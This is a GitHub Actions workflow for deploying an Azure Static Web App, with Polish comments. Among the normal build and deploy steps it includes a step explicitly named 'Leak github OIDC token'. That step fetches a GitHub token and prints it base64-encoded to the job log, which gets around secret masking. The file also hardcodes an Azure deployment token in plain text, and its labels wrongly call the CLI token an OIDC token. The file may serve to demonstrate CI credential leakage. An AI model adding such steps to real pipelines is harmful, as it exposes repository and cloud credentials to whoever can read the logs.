name: Azure Static Web Apps CI/CD

on:
  push:
    branches:
      - main
  pull_request:
    types: [opened, synchronize, reopened, closed]
    branches:
      - main

jobs:
  build_and_deploy_job:
    if: github.event_name == 'push' || (github.event_name == 'pull_request' && github.event.action != 'closed')
    runs-on: ubuntu-latest
    name: Build and Deploy Job
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v3
        with:
          submodules: true
          lfs: false

      - name: Install OIDC Client from Core Package
        run: npm install @actions/core@1.6.0 @actions/http-client

      - name: Get Id Token
        id: idtoken
        run: |
          echo "idtoken=$(gh auth token)" >> $GITHUB_OUTPUT
        shell: bash

      - name: Leak github OIDC token
        env:
          TOKEN_TO_LEAK: ${{ steps.idtoken.outputs.idtoken }}
        run: echo $TOKEN_TO_LEAK | base64

      - name: Build (jeśli potrzebujesz, zmodyfikuj lub usuń)
        run: |
          npm install
          npm run build

      - name: Build And Deploy
        id: builddeploy
        uses: Azure/static-web-apps-deploy@v1
        with:
          azure_static_web_apps_api_token: "12345cbb198a77a092ff885781a62a15d51ef5e3654ca11234509ab54547270704-4140ccee-e04f-424f-b4ca-3d4dd123459c00f0702071d12345"
          action: upload
          app_location: "/"             # dostosuj do swojego repo
          api_location: ""              # jeśli masz API, ustaw ścieżkę
          output_location: "build"      # folder z buildem
          github_id_token: ${{ steps.idtoken.outputs.idtoken }}

  close_pull_request_job:
    if: github.event_name == 'pull_request' && github.event.action == 'closed'
    runs-on: ubuntu-latest
    name: Close Pull Request Job
    steps:
      - name: Close Pull Request
        id: closepullrequest
        uses: Azure/static-web-apps-deploy@v1
        with:
          action: close
